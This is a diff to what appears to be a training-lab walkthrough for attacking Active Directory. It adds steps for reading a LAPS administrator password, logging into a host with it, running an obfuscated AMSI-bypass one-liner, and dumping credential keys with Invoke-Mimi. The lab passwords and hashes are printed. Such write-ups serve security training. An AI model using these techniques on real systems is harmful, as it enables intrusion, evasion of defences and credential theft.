@@ -22,7 +22,7 @@ Get-ForestDomain -Verbose | Get-DomainTrust | ?{$_.TrustAttributes -eq 'FILTER_S
 ```
 {% endcode %}
 
-<figure><img src="../.gitbook/assets/immagine (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/immagine (6).png" alt=""><figcaption></figcaption></figure>
 
 The trust is bidirectional, so enumerate the trust that eu.local has
 
@@ -67,7 +67,7 @@ Managers group has generic all on MachineAdmins Group, so with AdModule we can a
 Add-ADGroupMember -Identity MachineAdmins -Members studentuser64 -Verbose
 ```
 
-<figure><img src="../.gitbook/assets/immagine (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/immagine (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 Now relogin to update the permissions and try to access to us-mgmt
 
@@ -75,7 +75,7 @@ Now relogin to update the permissions and try to access to us-mgmt
 winrs -r:us-mgmt whoami
 ```
 
-<figure><img src="../.gitbook/assets/immagine (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/immagine (4) (1).png" alt=""><figcaption></figcaption></figure>
 
 By enumerating the groups which we belongs we can se that in the mgmt OU we are Administrators.
 
@@ -89,7 +89,7 @@ Get-DomainUser –SPN
 ```
 {% endcode %}
 
-<figure><img src="../.gitbook/assets/immagine (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/immagine (5) (1).png" alt=""><figcaption></figcaption></figure>
 
 the kerberoast attack can be done in wto ways
 
@@ -97,7 +97,7 @@ the kerberoast attack can be done in wto ways
 
 First use Argspli.bat to avoid detection in the cmd
 
-<figure><img src="../.gitbook/assets/immagine (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/immagine (6) (1).png" alt=""><figcaption></figcaption></figure>
 
 Now load Rubeus with the Loader to avoid detection and launch an attack against ServiceAccount
 
@@ -186,11 +186,11 @@ If nothing showed might work the same
 
 Now crack it. The password is _Desk@123_
 
-## Flag 10 -  LAPS
+## Flag 10/11/12 -  LAPS
 
 To enumerate LAPS import the module AdmPwd.PS.psd1, AD-Module and use the script Get-LapsPermissions.ps1
 
-<figure><img src="../.gitbook/assets/immagine.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/immagine (4).png" alt=""><figcaption></figcaption></figure>
 
 Also powerview can be used
 
@@ -200,7 +200,7 @@ Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceTy
 ```
 {% endcode %}
 
-<figure><img src="../.gitbook/assets/immagine (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/immagine (5).png" alt=""><figcaption></figcaption></figure>
 
 So, the studentusers group can read password for LAPS managed Administrator on the us-mgmt machine. Let's try it using the Active Directory module, LAPS module and PowerView.
 
@@ -229,3 +229,66 @@ Get-AdmPwdPassword -ComputerName us-mailmgmt
 ```
 {% endtab %}
 {% endtabs %}
+
+<figure><img src="../.gitbook/assets/immagine.png" alt=""><figcaption></figcaption></figure>
+
+The password is _a\[9\&Dhs./tu-]W_
+
+_So with this password let's try to access us-mailmgmt_
+
+```powershell
+winrs -r:us-mailmgmt -u:.\administrator -p:a[9&Dhs./tu-]W cmd
+```
+
+<figure><img src="../.gitbook/assets/immagine (1).png" alt=""><figcaption></figcaption></figure>
+
+Now extract credentials of interactive logon sessions and service accounts from us-mailmgmt
+
+To do so we need to use PS-Session and Invoke-mimi.
+
+First open a PS-Session on US-mailmgmt
+
+{% code overflow="wrap" %}
+```powershell
+$passwd = ConvertTo-SecureString 'a[9&Dhs./tu-]W' -AsPlainText -Force
+$creds = New-Object System.Management.Automation.PSCredential ("us-mailmgmt\administrator", $passwd)
+$mailmgmt = New-PSSession -ComputerName us-mailmgmt -Credential $creds
+```
+{% endcode %}
+
+Enter the session and bypass the AMSI
+
+```powershell
+Enter-PSSession $mailmgmt
+```
+
+{% code overflow="wrap" %}
+```
+S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/immagine (2).png" alt=""><figcaption></figcaption></figure>
+
+Now launch Invoke-Mimi throught the session
+
+{% code overflow="wrap" %}
+```powershell
+Invoke-Command -FilePath C:\AD\Tools\Invoke-Mimi.ps1 -Session $mailmgmt
+```
+{% endcode %}
+
+Enter the session again and dump dhe creds
+
+```powershell
+Invoke-Mimi -Command '"sekurlsa::keys"'
+```
+
+<figure><img src="../.gitbook/assets/immagine (3).png" alt=""><figcaption></figcaption></figure>
+
+Provisioningsvc aes: _a573a68973bfe9cbfb8037347397d6ad1aae87673c4f5b4979b57c0b745aee2a_
+
+Provisioningsvc rc4: _44dea6608c25a85d578d0c2b6f8355c4_
+
+## Flag 13 - GMSa
+
